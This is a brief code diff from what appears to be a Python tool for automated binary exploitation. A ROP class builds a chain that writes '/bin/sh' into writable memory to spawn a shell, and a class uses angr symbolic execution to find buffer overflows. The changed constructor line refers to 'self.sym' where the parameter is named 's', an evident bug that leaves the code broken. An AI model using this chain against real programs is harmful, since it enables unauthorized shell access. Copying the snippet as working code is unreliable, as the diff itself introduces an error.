@@ -180,8 +180,9 @@ class ROP:
         return [prim[0][:2], prim[1]]
     def get_writeable_mem(self):
         return self.analysis.elf.sym['__data_start']
-
-    def do_the_thing(self):
+    
+    # wrightes /bin/sh into memory
+    def write_binsh(self):
         ret = b''
         ret += self.fill_reg(self.get_primitive_regs()[0], self.get_writeable_mem())
         ret += self.fill_reg(self.get_primitive_regs()[1].strip(' '), '/bin/sh\0')
@@ -196,7 +197,7 @@ class Get2overflow:
     def __init__(s, binary):
         s.elf = context.binary =  ELF(binary)
         s.proj = angr.Project(binary)
-        start_addr = s.elf.sym["main"]
+        start_addr = self.sym["main"]
         # Maybe change to symbolic file stream
         buff_size = 1024
         s.symbolic_input = claripy.BVS("input", 8 * buff_size)
